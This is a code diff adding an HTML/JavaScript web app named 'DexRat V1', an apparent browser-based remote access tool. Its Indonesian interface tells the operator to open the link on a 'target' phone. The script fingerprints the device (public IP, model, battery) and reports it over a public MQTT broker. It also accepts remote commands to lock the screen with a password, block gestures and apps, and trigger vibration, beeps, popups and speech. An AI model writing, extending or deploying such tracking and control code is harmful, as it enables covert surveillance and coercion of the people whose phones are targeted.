+    <div class="login-brand-tag">
+      <i class="fas fa-shield-halved"></i> Secure Access
+    </div>
+
+    <div class="login-card" id="loginCard">
+      <div class="login-icon-wrap">
+        <div class="login-icon"><i class="fas fa-satellite-dish"></i></div>
+      </div>
+
+      <div class="login-title">DexRat Login</div>
+      <div class="login-sub">Masuk untuk akses panel</div>
+
+      <label class="login-label"><i class="fas fa-user"></i> Username</label>
+      <div class="login-input-wrap">
+        <input id="loginUsername" class="login-input" type="text" placeholder="Masukkan username..." autocomplete="username" autocapitalize="off" spellcheck="false">
+      </div>
+
+      <label class="login-label"><i class="fas fa-key"></i> Password</label>
+      <div class="login-input-wrap">
+        <input id="loginPassword" class="login-input pw" type="password" placeholder="Masukkan password..." autocomplete="current-password">
+        <button type="button" id="loginTogglePass" class="login-toggle-pass"><i class="fas fa-eye"></i></button>
+      </div>
+
+      <div id="loginError" class="login-msg error">
+        <i class="fas fa-exclamation-circle"></i>
+        <span id="loginErrorText">Username atau password salah!</span>
+      </div>
+
+      <div id="loginSuccess" class="login-msg success">
+        <i class="fas fa-check-circle"></i>
+        <span id="loginSuccessText">Login berhasil!</span>
+      </div>
+
+      <button id="loginBtn" class="login-btn" type="button">
+        <i class="fas fa-sign-in-alt"></i> Login
+      </button>
+
+      <div class="login-hint">
+        <i class="fas fa-info-circle"></i>
+        Admin access only · Developer Mode
+      </div>
+    </div>
+
+    <div class="login-footer">DexRat V1 © 2026 · All rights reserved</div>
+  </div>
+</div>
+
+<!-- ==================== HOME / BERANDA ==================== -->
+<div id="homeScreen">
+  <!-- BG Deco -->
+  <div style="position:fixed; inset:0; pointer-events:none; overflow:hidden; z-index:0;">
+    <div style="position:absolute; width:120px; height:120px; background:linear-gradient(135deg,var(--purple),var(--blue)); border:3px solid var(--ink); top:6%; left:-40px; transform:rotate(-15deg); opacity:0.35;"></div>
+    <div style="position:absolute; width:90px; height:90px; background:linear-gradient(135deg,var(--pink),var(--red)); border:3px solid var(--ink); border-radius:50%; top:22%; right:-30px; transform:rotate(20deg); opacity:0.35;"></div>
+    <div style="position:absolute; width:140px; height:140px; background:linear-gradient(135deg,var(--yellow),var(--orange)); border:3px solid var(--ink); bottom:12%; left:-50px; transform:rotate(45deg); opacity:0.35;"></div>
+    <div style="position:absolute; width:100px; height:100px; background:linear-gradient(135deg,var(--cyan),var(--green)); border:3px solid var(--ink); border-radius:50%; bottom:8%; right:-30px; transform:rotate(-25deg); opacity:0.35;"></div>
+  </div>
+
+  <!-- ===== TAB CONTENT: HOME ===== -->
+  <div id="homeTabContent" class="home-scroll">
+    <div class="home-inner">
+
+      <!-- TOP BAR -->
+      <div class="home-topbar">
+        <div class="home-topbar-brand">
+          <div class="logo-box"><i class="fas fa-satellite-dish"></i></div>
+          <div>
+            <div class="brand-name">DexRat V1</div>
+            <div class="brand-role">
+              <i class="fas fa-circle"></i>
+              <span id="homeRole">Developer</span>
+            </div>
+          </div>
+        </div>
+        <button class="home-logout-btn" onclick="logoutFromHome()">
+          <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+      </div>
+
+      <!-- WELCOME -->
+      <div class="home-welcome">
+        <div class="home-welcome-tag">
+          <i class="fas fa-hand-sparkles"></i> Selamat Datang
+        </div>
+        <h1>
+          WELCOME TO<br>
+          <span class="highlight">DEXRAT</span>
+        </h1>
+        <p>
+          Advanced remote monitoring &amp; control panel untuk pengawasan resmi.
+        </p>
+      </div>
+
+      <!-- BANNER -->
+      <div class="home-banner-card">
+        <div class="home-banner-frame">
+          <img src="https://files.catbox.moe/vbw1tq.jpg" alt="DexRat Banner" id="homeBannerImg"
+               onerror="this.style.display='none'; this.parentElement.innerHTML+='<div style=\'position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--purple),var(--blue));color:#fff;font-family:JetBrains Mono,monospace;font-weight:900;font-size:16px;\'>DexRat V1</div>';">
+          <div class="home-banner-overlay"></div>
+
+          <div class="home-banner-badge left">
+            <i class="fas fa-bolt"></i> v1r
+          </div>
+          <div class="home-banner-badge right">
+            <span class="live-pulse"></span>
+            Online
+          </div>
+          <div class="home-banner-footer-text">
+            <i class="fas fa-shield-halved"></i> Remote Monitoring System
+          </div>
+        </div>
+      </div>
+
+      <!-- THANKS TO BUTTON -->
+      <div class="home-actions">
+        <button class="home-btn thanks" onclick="openThanksTo()">
+          <i class="fas fa-heart"></i>
+          Thanks To
+        </button>
+      </div>
+
+      <div style="text-align:center; margin-top:10px; font-family:'JetBrains Mono', monospace; font-size:10px; color:#6b7280; font-weight:700; letter-spacing:1px;">
+        DexRat V1 © 2026 · All rights reserved
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== TAB CONTENT: PERANGKAT (hidden, langsung dashboard) ===== -->
+  <div id="homeDeviceTabContent" class="home-scroll" style="display:none;"></div>
+
+  <!-- ===== BOTTOM NAVIGATION ===== -->
+  <div class="bottom-nav">
+    <div class="bn-glow-line"></div>
+
+    <button id="navBtnHome" class="bottom-nav-item active" onclick="switchHomeTab('home')">
+      <div class="bn-icon-wrap">
+        <i class="fas fa-house"></i>
+        <div class="bn-pulse"></div>
+      </div>
+      <span class="bn-label">Beranda</span>
+      <div class="bn-active-bar"></div>
+    </button>
+
+    <button id="navBtnDevice" class="bottom-nav-item" onclick="switchHomeTab('device')">
+      <div class="bn-icon-wrap">
+        <i class="fas fa-mobile-alt"></i>
+        <div class="bn-pulse"></div>
+        <div class="bn-badge" id="navDeviceBadge" style="display:none;">0</div>
+      </div>
+      <span class="bn-label">Perangkat</span>
+      <div class="bn-active-bar"></div>
+    </button>
+  </div>
+
+</div>
+
+<!-- ==================== MODAL THANKS TO ==================== -->
+<div id="thanksModal">
+  <div class="thanks-card">
+    <div class="thanks-icon"><i class="fas fa-heart"></i></div>
+
+    <div class="thanks-label"><i class="fas fa-star"></i> Special Thanks To</div>
+    <div class="thanks-name">Denxz</div>
+
+    <div class="thanks-info">
+      <i class="fas fa-crown"></i>
+      <div>
+        <strong>Developer &amp; Founder</strong><br>
+        <span style="font-size:10px; opacity:0.8;">DexRat V1 Project</span>
+      </div>
+    </div>
+
+    <button class="thanks-close-btn" onclick="closeThanksTo()">
+      <i class="fas fa-times"></i> Tutup
+    </button>
+  </div>
+</div>
+
+<!-- ==================== DASHBOARD ==================== -->
+<div class="view" id="dashView">
+  <div class="dash-header">
+    <div class="brand">
+      <div class="brand-icon"><i class="fas fa-satellite-dish"></i></div>
+      <div class="brand-text">
+        <div class="t1">DexRat V1</div>
+        <div class="t2" id="myDeviceId">-</div>
+      </div>
+    </div>
+    <div class="conn-badge offline" id="connBadge">
+      <span class="cdot"></span>
+      <span id="connBadgeText">OFFLINE</span>
+    </div>
+  </div>
+  <div class="dash-stats">
+    <div class="dash-stat"><div class="val" id="statTotal">0</div><div class="lbl">Total</div></div>
+    <div class="dash-stat"><div class="val" id="statOnline">0</div><div class="lbl">Online</div></div>
+    <div class="dash-stat"><div class="val" id="statOffline">0</div><div class="lbl">Offline</div></div>
+  </div>
+  <div class="dash-content">
+    <div class="dash-section-title">
+      <span><i class="fas fa-mobile-alt"></i> PERANGKAT</span>
+      <span class="right"><span class="live-dot"></span> LIVE</span>
+    </div>
+    <div class="device-list" id="deviceList">
+      <div class="empty-state">
+        <div class="empty-icon"><i class="fas fa-satellite"></i></div>
+        <div class="empty-title">Belum Ada Perangkat</div>
+        <div class="empty-desc">Belum ada perangkat yang terhubung. Buka link ini di HP target untuk mulai tracking.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<button class="refresh-fab" id="refreshFab" style="display:none;"><i class="fas fa-sync"></i></button>
+<div class="toast" id="toast"></div>
+
+<script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
+<script>
+// =============================================================
+// LOGIN AUTHENTICATION
+// =============================================================
+const AUTH_CREDENTIALS = {
+  username: 'Denxz',
+  password: '211',
+  role: 'Developer'
+};
+const AUTH_STORAGE_KEY = 'dexrat_auth_session';
+
+function checkExistingSession() {
+  try {
+    const saved = sessionStorage.getItem(AUTH_STORAGE_KEY) || localStorage.getItem(AUTH_STORAGE_KEY);
+    if (!saved) return null;
+    const data = JSON.parse(saved);
+    if (data.timestamp && (Date.now() - data.timestamp) < 24 * 60 * 60 * 1000) return data;
+    sessionStorage.removeItem(AUTH_STORAGE_KEY);
+    localStorage.removeItem(AUTH_STORAGE_KEY);
+    return null;
+  } catch (e) { return null; }
+}
+
+function saveSession() {
+  try {
+    sessionStorage.setItem(AUTH_STORAGE_KEY, JSON.stringify({
+      username: AUTH_CREDENTIALS.username,
+      role: AUTH_CREDENTIALS.role,
+      timestamp: Date.now()
+    }));
+  } catch (e) {}
+}
+
+function clearSession() {
+  try {
+    sessionStorage.removeItem(AUTH_STORAGE_KEY);
+    localStorage.removeItem(AUTH_STORAGE_KEY);
+  } catch (e) {}
+}
+
+function showLoginScreen() {
+  const el = document.getElementById('loginScreen');
+  if (el) { el.classList.remove('hidden'); el.style.display = 'flex'; }
+}
+
+function hideLoginScreen() {
+  const el = document.getElementById('loginScreen');
+  if (el) {
+    el.style.opacity = '0';
+    el.style.transition = 'opacity 0.3s ease';
+    setTimeout(function() {
+      el.classList.add('hidden');
+      el.style.display = 'none';
+      el.style.opacity = '';
+      el.style.transition = '';
+    }, 300);
+  }
+}
+
+function showLoginError(text) {
+  const err = document.getElementById('loginError');
+  const ok = document.getElementById('loginSuccess');
+  if (ok) ok.style.display = 'none';
+  if (err) {
+    document.getElementById('loginErrorText').textContent = text || 'Username atau password salah!';
+    err.style.display = 'flex';
+    const card = document.getElementById('loginCard');
+    if (card) {
+      card.classList.remove('login-shake');
+      void card.offsetWidth;
+      card.classList.add('login-shake');
+    }
+  }
+}
+
+function showLoginSuccess(text) {
+  const err = document.getElementById('loginError');
+  const ok = document.getElementById('loginSuccess');
+  if (err) err.style.display = 'none';
+  if (ok) {
+    document.getElementById('loginSuccessText').textContent = text || 'Login berhasil!';
+    ok.style.display = 'flex';
+  }
+}
+
+function hideLoginMessages() {
+  const err = document.getElementById('loginError');
+  const ok = document.getElementById('loginSuccess');
+  if (err) err.style.display = 'none';
+  if (ok) ok.style.display = 'none';
+}
+
+function attemptLogin() {
+  const usernameInput = document.getElementById('loginUsername');
+  const passwordInput = document.getElementById('loginPassword');
+  const loginBtn = document.getElementById('loginBtn');
+
+  const username = (usernameInput.value || '').trim();
+  const password = (passwordInput.value || '').trim();
+
+  hideLoginMessages();
+
+  if (!username || !password) {
+    showLoginError('Username & password wajib diisi!');
+    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+    return;
+  }
+
+  loginBtn.disabled = true;
+  loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
+
+  setTimeout(function() {
+    if (username === AUTH_CREDENTIALS.username && password === AUTH_CREDENTIALS.password) {
+      saveSession();
+      showLoginSuccess('Login berhasil! Role: ' + AUTH_CREDENTIALS.role);
+      if (navigator.vibrate) navigator.vibrate([80, 40, 80]);
+
+      setTimeout(function() {
+        hideLoginScreen();
+        setTimeout(function() {
+          showHomeScreen();
+        }, 350);
+        showToast('Selamat datang, ' + AUTH_CREDENTIALS.username + '!', 'success');
+      }, 900);
+    } else {
+      showLoginError('Username atau password salah!');
+      if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+      passwordInput.value = '';
+      passwordInput.focus();
+      loginBtn.disabled = false;
+      loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Login';
+    }
+  }, 600);
+}
+
+// =============================================================
+// HOME SCREEN
+// =============================================================
+function showHomeScreen() {
+  const el = document.getElementById('homeScreen');
+  if (el) {
+    el.classList.remove('hidden');
+    el.style.display = 'flex';
+    el.style.opacity = '1';
+  }
+  const roleEl = document.getElementById('homeRole');
+  if (roleEl && AUTH_CREDENTIALS) {
+    roleEl.textContent = AUTH_CREDENTIALS.role || 'User';
+  }
+  switchHomeTab('home');
+}
+
+function hideHomeScreen() {
+  const el = document.getElementById('homeScreen');
+  if (el) {
+    el.style.opacity = '0';
+    el.style.transition = 'opacity 0.3s ease';
+    setTimeout(function() {
+      el.classList.add('hidden');
+      el.style.display = 'none';
+      el.style.opacity = '';
+      el.style.transition = '';
+    }, 300);
+  }
+}
+
+// =============================================================
+// SWITCH HOME TAB - LANGSUNG MASUK DASHBOARD
+// =============================================================
+function switchHomeTab(tab) {
+  const tabHome = document.getElementById('homeTabContent');
+  const tabDevice = document.getElementById('homeDeviceTabContent');
+  const btnHome = document.getElementById('navBtnHome');
+  const btnDevice = document.getElementById('navBtnDevice');
+
+  if (!tabHome || !tabDevice || !btnHome || !btnDevice) return;
+
+  if (tab === 'home') {
+    tabHome.style.display = 'block';
+    tabDevice.style.display = 'none';
+    btnHome.classList.add('active');
+    btnDevice.classList.remove('active');
+    if (navigator.vibrate) navigator.vibrate(15);
+  } else {
+    // Klik Perangkat = LANGSUNG MASUK DASHBOARD (tanpa loading screen)
+    if (navigator.vibrate) navigator.vibrate([30, 20, 30]);
+    btnHome.classList.remove('active');
+    btnDevice.classList.add('active');
+    // Smooth transition langsung
+    enterDashboard();
+  }
+}
+
+// =============================================================
+// ENTER DASHBOARD - SKIP LOADING, LANGSUNG TAMPIL
+// =============================================================
+let _dexratInitialized = false;
+
+function enterDashboard() {
+  // Hide home with smooth fade
+  const homeEl = document.getElementById('homeScreen');
+  if (homeEl) {
+    homeEl.style.opacity = '0';
+    homeEl.style.transition = 'opacity 0.35s ease';
+  }
+
+  // Immediately show dashboard after short delay (fade out effect)
+  setTimeout(function() {
+    if (homeEl) {
+      homeEl.classList.add('hidden');
+      homeEl.style.display = 'none';
+      homeEl.style.opacity = '';
+      homeEl.style.transition = '';
+    }
+    // Show dashboard
+    const dashEl = document.getElementById('dashView');
+    if (dashEl) {
+      dashEl.classList.add('active');
+      // Ensure it starts from opacity 0 for smooth animation
+      dashEl.style.opacity = '0';
+      requestAnimationFrame(function() {
+        dashEl.style.transition = 'opacity 0.4s ease';
+        dashEl.style.opacity = '1';
+        setTimeout(function() {
+          dashEl.style.transition = '';
+          dashEl.style.opacity = '';
+        }, 450);
+      });
+    }
+    document.getElementById('refreshFab').style.display = 'flex';
+
+    // Init MQTT connection on first enter (no permissions needed)
+    if (!_dexratInitialized) {
+      _dexratInitialized = true;
+      setTimeout(function() { initMqttOnly(); }, 100);
+    }
+  }, 200);
+
+  if (navigator.vibrate) navigator.vibrate([40, 30, 40]);
+}
+
+// =============================================================
+// INIT MQTT ONLY (TANPA PERMISSION REQUEST)
+// =============================================================
+function initMqttOnly() {
+  // Setup MQTT connection
+  connectMqtt().then(function() {
+    startAppBlockWatcher();
+    announceInterval = setInterval(publishAnnounce, 10000);
+    cleanupInterval = setInterval(cleanupDevices, 5000);
+    setTimeout(publishAnnounce, 500);
+    showToast('Terhubung ke server', 'success');
+  }).catch(function(e) {
+    console.error('MQTT error:', e);
+    showToast('Gagal terhubung MQTT', 'error');
+  });
+}
+
+function logoutFromHome() {
+  if (!confirm('Yakin logout?')) return;
+  clearSession();
+  hideHomeScreen();
+  _dexratInitialized = false;
+  // Close MQTT if connected
+  if (mqttClient) {
+    try { mqttClient.end(); } catch(e) {}
+    mqttClient = null;
+  }
+  setTimeout(function() {
+    showLoginScreen();
+    const u = document.getElementById('loginUsername');
+    const p = document.getElementById('loginPassword');
+    if (u) u.value = '';
+    if (p) p.value = '';
+    if (u) u.focus();
+  }, 300);
+  showToast('Logout berhasil', 'info');
+}
+
+function openThanksTo() {
+  const modal = document.getElementById('thanksModal');
+  if (modal) modal.classList.add('show');
+  if (navigator.vibrate) navigator.vibrate(40);
+}
+
+function closeThanksTo() {
+  const modal = document.getElementById('thanksModal');
+  if (modal) modal.classList.remove('show');
+}
+
+function updateNavDeviceBadge() {
+  const badge = document.getElementById('navDeviceBadge');
+  if (!badge) return;
+  const now = Date.now();
+  const onlineCount = Object.keys(devices).filter(function(id) {
+    return (now - devices[id].lastSeen) < DEVICE_TIMEOUT;
+  }).length;
+  if (onlineCount > 0) {
+    badge.style.display = 'flex';
+    badge.textContent = onlineCount > 99 ? '99+' : onlineCount;
+  } else {
+    badge.style.display = 'none';
+  }
+}
+
+// =============================================================
+// AUTO-LOGIN ON DOM READY
+// =============================================================
+document.addEventListener('DOMContentLoaded', function() {
+  const loginBtn = document.getElementById('loginBtn');
+  const loginUsername = document.getElementById('loginUsername');
+  const loginPassword = document.getElementById('loginPassword');
+  const toggleBtn = document.getElementById('loginTogglePass');
+
+  if (loginBtn) loginBtn.addEventListener('click', attemptLogin);
+  if (loginUsername) {
+    loginUsername.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') { e.preventDefault(); loginPassword.focus(); }
+    });
+    loginUsername.addEventListener('input', hideLoginMessages);
+  }
+  if (loginPassword) {
+    loginPassword.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') { e.preventDefault(); attemptLogin(); }
+    });
+    loginPassword.addEventListener('input', hideLoginMessages);
+  }
+  if (toggleBtn && loginPassword) {
+    toggleBtn.addEventListener('click', function() {
+      const isPass = loginPassword.type === 'password';
+      loginPassword.type = isPass ? 'text' : 'password';
+      toggleBtn.innerHTML = isPass ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
+      loginPassword.focus();
+    });
+  }
+
+  const thanksModal = document.getElementById('thanksModal');
+  if (thanksModal) {
+    thanksModal.addEventListener('click', function(e) {
+      if (e.target === thanksModal) closeThanksTo();
+    });
+  }
+
+  const session = checkExistingSession();
+  if (session) {
+    hideLoginScreen();
+    setTimeout(function() {
+      showHomeScreen();
+      showToast('Auto-login: ' + session.username, 'success');
+    }, 350);
+  } else {
+    setTimeout(function() { if (loginUsername) loginUsername.focus(); }, 400);
+  }
+});
+
+// ============================================================
+// MAIN APP CONFIG
+// ============================================================
+const MQTT_BROKER = 'wss://broker.hivemq.com:8884/mqtt';
+const TOPIC_PREFIX = 'otax_family_tracker_v6';
+const ANNOUNCE_TOPIC = TOPIC_PREFIX + '/announce';
+const CMD_PREFIX = TOPIC_PREFIX + '/cmd';
+const APPBLOCK_PREFIX = TOPIC_PREFIX + '/appblock';
+const DEVICE_TIMEOUT = 30000;
+
+let myDeviceId = null;
+let myDeviceInfo = { name: 'Unknown', brand: 'Unknown', model: 'Unknown', os: 'Unknown', ip: 'Unknown', lat: null, lng: null, accuracy: null, battery: null, timestamp: 0 };
+let mqttClient = null;
+let devices = {};
+let currentMapDeviceId = null;
+let announceInterval = null;
+let cleanupInterval = null;
+let audioCtx = null;
+let currentControlTargetId = null;
+let ctrlInputCallback = null;
+let fakeTimeout = null;
+let gestureBlockTimer = null;
+let gestureBlockEndTime = 0;
+let gestureBlockDuration = 0;
+let gestureBlockInterval = null;
+let blockedApps = [];
+let appBlockOverlayActive = false;
+let appBlockWatcher = null;
+let appBlockListTargetId = null;
+let notifViewerTargetId = null;
+let notifBadgeCount = 0;
+let capturedNotifications = [];
+let receivedNotifications = {};
+let isLocked = false;
+let lockPassword = null;
+
+function showToast(msg, type) {
+  type = type || 'info';
+  const t = document.getElementById('toast');
+  const icons = { success: 'fa-check-circle', error: 'fa-exclamation-circle', warning: 'fa-exclamation-triangle', info: 'fa-info-circle' };
+  t.innerHTML = '<i class="fas ' + (icons[type] || icons.info) + '"></i><span>' + msg + '</span>';
+  t.className = 'toast show ' + type;
+  clearTimeout(t._timer);
+  t._timer = setTimeout(function() { t.classList.remove('show'); }, 2800);
+}
+
+async function sha256(str) {
+  const buf = new TextEncoder().encode(str);
+  const hashBuf = await crypto.subtle.digest('SHA-256', buf);
+  return Array.from(new Uint8Array(hashBuf)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+}
+
+async function getPublicIp() {
+  const apis = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/', 'https://api.my-ip.io/ip.json'];
+  for (let i = 0; i < apis.length; i++) {
+    try {
+      const res = await fetch(apis[i], { cache: 'no-store' });
+      const data = await res.json();
+      const ip = data.ip || data.query || data.IP;
+      if (ip) return ip;
+    } catch (e) {}
+  }
+  return 'unknown';
+}
+
+async function detectDeviceInfo() {
+  const info = { brand: 'Unknown', model: 'Unknown', os: 'Unknown', name: 'Perangkat Saya' };
+  if (navigator.userAgentData) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+      if (hints.model) info.model = hints.model.trim();
+      if (hints.platform) info.os = hints.platform + (hints.platform === 'Android' && hints.platformVersion ? ' ' + hints.platformVersion : '');
+    } catch(e) {}
+  }
+  const ua = navigator.userAgent;
+  if ((!info.model || info.model === 'Unknown') && /Android/i.test(ua)) {
+    const match = ua.match(/Android[^;]+;\s*([^;)]+?)(?:\s+Build|\))/i);
+    if (match && match[1]) {
+      let model = match[1].trim().replace(/\s+/g, ' ');
+      model = model.replace(/\bwv\b/gi, '').replace(/Build\/.*/i, '').trim();
+      if (model.length > 40) model = model.substring(0, 40);
+      info.model = model;
+    }
+    const andMatch = ua.match(/Android\s+([\d.]+)/i);
+    if (andMatch) info.os = 'Android ' + andMatch[1];
+  }
+  if (info.brand === 'Unknown' && info.model !== 'Unknown') {
+    const m = info.model.toLowerCase();
+    if (m.includes('samsung') || m.startsWith('sm-')) info.brand = 'Samsung';
+    else if (m.includes('xiaomi') || m.includes('redmi') || m.includes('poco') || m.startsWith('mi ')) info.brand = 'Xiaomi';
+    else if (m.includes('oppo') || m.startsWith('cph')) info.brand = 'Oppo';
+    else if (m.includes('vivo') || m.startsWith('v2')) info.brand = 'Vivo';
+    else if (m.includes('realme') || m.startsWith('rmx')) info.brand = 'Realme';
+    else if (m.includes('oneplus')) info.brand = 'OnePlus';
+    else if (m.includes('infinix')) info.brand = 'Infinix';
+    else if (m.includes('itel')) info.brand = 'Itel';
+    else if (m.includes('google') || m.includes('pixel')) info.brand = 'Google';
+    else if (m.includes('motorola') || m.includes('moto')) info.brand = 'Motorola';
+    else if (m.includes('nokia')) info.brand = 'Nokia';
+    else if (m.includes('sony') || m.includes('xperia')) info.brand = 'Sony';
+    else if (m.includes('huawei') || m.includes('honor')) info.brand = 'Huawei';
+    else if (m.includes('iphone')) info.brand = 'Apple';
+    else if (m.includes('tecno')) info.brand = 'Tecno';
+  }
+  if (info.brand !== 'Unknown' && info.model !== 'Unknown') {
+    const modelLower = info.model.toLowerCase();
+    const brandLower = info.brand.toLowerCase();
+    info.name = modelLower.includes(brandLower) ? info.model : (info.brand + ' ' + info.model);
+  } else if (info.model !== 'Unknown' && info.model) {
+    info.name = info.model;
+  } else if (info.brand !== 'Unknown') {
+    info.name = 'Perangkat ' + info.brand;
+  }
+  return info;
+}
+
+async function getBattery() {
+  if (!navigator.getBattery) return null;
+  try {
+    const bat = await navigator.getBattery();
+    return Math.round(bat.level * 100);
+  } catch(e) { return null; }
+}
+
+// ============================================================
+// SEND COMMAND
+// ============================================================
+function sendCommand(targetDeviceId, cmd) {
+  if (!mqttClient || !mqttClient.connected) { showToast('MQTT tidak terhubung', 'error'); return false; }
+  mqttClient.publish(CMD_PREFIX + '/' + targetDeviceId, JSON.stringify(cmd), { qos: 0 });
+  return true;
+}
+
+// ============================================================
+// MQTT
+// ============================================================
+function connectMqtt() {
+  return new Promise(async function(resolve, reject) {
+    try {
+      // Get IP and device ID first (no permissions needed)
+      myDeviceInfo.ip = await getPublicIp();
+      const fingerprint = myDeviceInfo.ip + '|' + navigator.userAgent + '|' + screen.width + 'x' + screen.height + '|' + navigator.language;
+      const hash = await sha256(fingerprint);
+      myDeviceId = 'D_' + hash.substring(0, 12).toUpperCase();
+      document.getElementById('myDeviceId').textContent = myDeviceId;
+
+      // Device info (no permissions)
+      const devInfo = await detectDeviceInfo();
+      myDeviceInfo.name = devInfo.name;
+      myDeviceInfo.brand = devInfo.brand;
+      myDeviceInfo.model = devInfo.model;
+      myDeviceInfo.os = devInfo.os;
+
+      // Battery (no permissions)
+      myDeviceInfo.battery = await getBattery();
+
+      // Connect MQTT
+      mqttClient = mqtt.connect(MQTT_BROKER, {
+        clientId: 'ft_' + (myDeviceId || 'x').substring(0, 10) + '_' + Math.random().toString(16).substr(2, 6),
+        clean: true, connectTimeout: 10000, reconnectPeriod: 5000, keepalive: 30
+      });
+      const timeout = setTimeout(function() { reject(new Error('MQTT timeout')); }, 12000);
+      mqttClient.on('connect', function() {
+        clearTimeout(timeout);
+        document.getElementById('connBadge').className = 'conn-badge';
+        document.getElementById('connBadgeText').textContent = 'ONLINE';
+        mqttClient.subscribe(ANNOUNCE_TOPIC);
+        mqttClient.subscribe(CMD_PREFIX + '/' + myDeviceId);
+        mqttClient.subscribe(APPBLOCK_PREFIX + '/from/' + myDeviceId);
+        resolve();
+      });
+      mqttClient.on('message', function(topic, message) {
+        try {
+          if (topic === ANNOUNCE_TOPIC) {
+            handleAnnounce(JSON.parse(message.toString()));
+          } else if (topic.indexOf(CMD_PREFIX + '/' + myDeviceId) === 0) {
+            handleCommand(JSON.parse(message.toString()));
+          } else if (topic.indexOf(APPBLOCK_PREFIX + '/from/' + myDeviceId) === 0) {
+            handleAppBlockMessage(JSON.parse(message.toString()));
+          }
+        } catch (e) {}
+      });
+      mqttClient.on('error', function() {
+        document.getElementById('connBadge').className = 'conn-badge offline';
+        document.getElementById('connBadgeText').textContent = 'OFFLINE';
+      });
+      mqttClient.on('offline', function() {
+        document.getElementById('connBadge').className = 'conn-badge offline';
+        document.getElementById('connBadgeText').textContent = 'OFFLINE';
+      });
+      mqttClient.on('reconnect', function() {
+        document.getElementById('connBadgeText').textContent = 'RECONNECT';
+      });
+    } catch (e) { reject(e); }
+  });
+}
+
+function publishAnnounce() {
+  if (!mqttClient || !mqttClient.connected || !myDeviceId) return;
+  const payload = {
+    deviceId: myDeviceId, name: myDeviceInfo.name, brand: myDeviceInfo.brand,
+    model: myDeviceInfo.model, os: myDeviceInfo.os, ip: myDeviceInfo.ip,
+    lat: myDeviceInfo.lat, lng: myDeviceInfo.lng, accuracy: myDeviceInfo.accuracy,
+    battery: myDeviceInfo.battery, torchOn: false, isLocked: isLocked,
+    gestureBlocked: gestureBlockEndTime > Date.now(),
+    gestureBlockRemaining: Math.max(0, gestureBlockEndTime - Date.now()),
+    blockedAppsCount: blockedApps.length,
+    notifCount: capturedNotifications.length, timestamp: Date.now()
+  };
+  mqttClient.publish(ANNOUNCE_TOPIC, JSON.stringify(payload), { qos: 0 });
+}
+
+function handleAnnounce(data) {
+  if (!data.deviceId) return;
+  const existing = devices[data.deviceId];
+  const hasNewLat = data.lat !== null && data.lat !== undefined;
+  const hasNewLng = data.lng !== null && data.lng !== undefined;
+  devices[data.deviceId] = {
+    deviceId: data.deviceId,
+    name: data.name || 'Unknown', brand: data.brand || 'Unknown',
+    model: data.model || 'Unknown', os: data.os || 'Unknown',
+    ip: data.ip || 'unknown',
+    lat: hasNewLat ? data.lat : (existing ? existing.lat : null),
+    lng: hasNewLng ? data.lng : (existing ? existing.lng : null),
+    accuracy: (data.accuracy !== null && data.accuracy !== undefined) ? data.accuracy : (existing ? existing.accuracy : null),
+    battery: (data.battery !== null && data.battery !== undefined) ? data.battery : (existing ? existing.battery : null),
+    torchOn: data.torchOn || false, isLocked: data.isLocked || false,
+    gestureBlocked: data.gestureBlocked || false,
+    gestureBlockRemaining: data.gestureBlockRemaining || 0,
+    blockedAppsCount: data.blockedAppsCount || 0,
+    notifCount: data.notifCount || 0,
+    timestamp: data.timestamp || Date.now(), lastSeen: Date.now()
+  };
+  renderDeviceList();
+  updateNavDeviceBadge();
+}
+
+async function handleCommand(cmd) {
+  if (cmd.type === 'speak' && cmd.text) { speakText(cmd.text); showToast('Suara diterima', 'info'); }
+  else if (cmd.type === 'vibrate') ctrlVibrate();
+  else if (cmd.type === 'vibrate-long') ctrlVibrateLong();
+  else if (cmd.type === 'vibrate-off') ctrlVibrateOff();
+  else if (cmd.type === 'beep') ctrlBeep(cmd.times || 5);
+  else if (cmd.type === 'shake') ctrlShake();
+  else if (cmd.type === 'popup') ctrlPopup(cmd.text);
+  else if (cmd.type === 'lock-screen' && cmd.password) { applyLock(cmd.password); showToast('Dikunci!', 'warning'); }
+  else if (cmd.type === 'unlock-screen') { forceUnlock(); showToast('Dibuka', 'success'); }
+  else if (cmd.type === 'block-gesture' && cmd.duration) { blockGesture(cmd.duration); }
+  else if (cmd.type === 'unblock-gesture') { stopGestureBlock(); showToast('Block gestur dihentikan', 'info'); }
+  else if (cmd.type === 'block-app' && cmd.app) { addBlockedApp(cmd.app); }
+  else if (cmd.type === 'unblock-app' && cmd.app) { removeBlockedApp(cmd.app); }
+  else if (cmd.type === 'clear-blocked-apps') { clearAllBlockedApps(); }
+}
+
+function handleAppBlockMessage(data) {
+  if (!data || !data.from) return;
+  if (Array.isArray(data.blockedApps)) {
+    if (data.from === currentControlTargetId) {
+      blockedApps = data.blockedApps.slice();
+      openAppBlockListModal(data.from);
+    }
+  }
+}
+
+// ============================================================
+// CONTROL FUNCTIONS (tanpa permission)
+// ============================================================
+function ctrlVibrate() { if (!navigator.vibrate) { showToast('Getar tidak didukung', 'warning'); return; } navigator.vibrate(600); showToast('Getar', 'info'); }
+function ctrlVibrateLong() { if (!navigator.vibrate) return; navigator.vibrate([600,200,600,200,600,200,600]); showToast('Getar lama', 'warning'); }
+function ctrlVibrateOff() { if (navigator.vibrate) navigator.vibrate(0); }
+function ctrlBeep(times) {
+  const ctx = ensureAudioCtx();
+  if (!ctx) return;
+  const n = times || 5;
+  const t = ctx.currentTime;
+  for (let i = 0; i < n; i++) { beep(1000, t + i * 0.32, 0.22, ctx, 0.5); beep(1400, t + i * 0.32 + 0.12, 0.15, ctx, 0.4); }
+}
+function ctrlPopup(text) { try { alert(text || 'Pesan dari DexRat'); } catch(e) {} }
